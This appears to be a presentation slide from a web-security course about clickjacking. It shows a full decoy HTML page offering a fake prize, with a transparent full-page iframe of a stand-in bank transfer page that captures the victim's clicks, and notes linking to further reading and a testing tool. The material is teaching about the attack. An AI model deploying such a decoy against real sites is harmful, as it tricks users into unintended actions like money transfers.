---
# class: pl-15% pr-15% pt-10%
layout: center
title: Clickjacking
---
<h1>Hijacking user's clicks</h1>

<Transform scale="1">

```html {all|13-24}
<!DOCTYPE html>
<html lang="en-US">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Decoy web page</title>
</head>
<body>
  <div>
    <h1>You won!</h1>
    <p>Click DECOY BUTTON to get your prize!</p>
  </div>
  <div style="position: absolute; left: 25%; top: 35%;">
    <!-- never gets clicked since the iframe covers the entire page -->
    <button type="button" style="border-color: red; border-width: 2px; color: red;">
      DECOY BUTTON
    </button>
  </div>
  <!-- this iframe captures all clicks, since it covers the entire page -->
  <iframe style="opacity: 0;" width="680" height="480" scrolling="no"
    src="https://vulnerable-bank.com/transfer.html">
  </iframe>
</body>
</html>
```

</Transform>

<!--
Clickjacking (aka UI redressing) stands for click hijacking.

The HTML document rendered in the iframe (e.g. https://vulnerable-bank.com/transfer.html) could even be a legit website, but it's rendered in a decoy web page that tricks the user into clicking on a button/link that the user does not see.

- [Clickjacking (UI redressing)](https://portswigger.net/web-security/clickjacking)
- [Clickjack attack – the hidden threat right in front of you](https://www.troyhunt.com/clickjack-attack-hidden-threat-right-in/)

[Burp Clickbandit](https://portswigger.net/burp/documentation/desktop/tools/clickbandit) makes it quicker and easier to test for clickjacking vulnerabilities.

An HTTP header that start with an "X-" is not part of the HTTP spec. Such header is called custom header.
-->
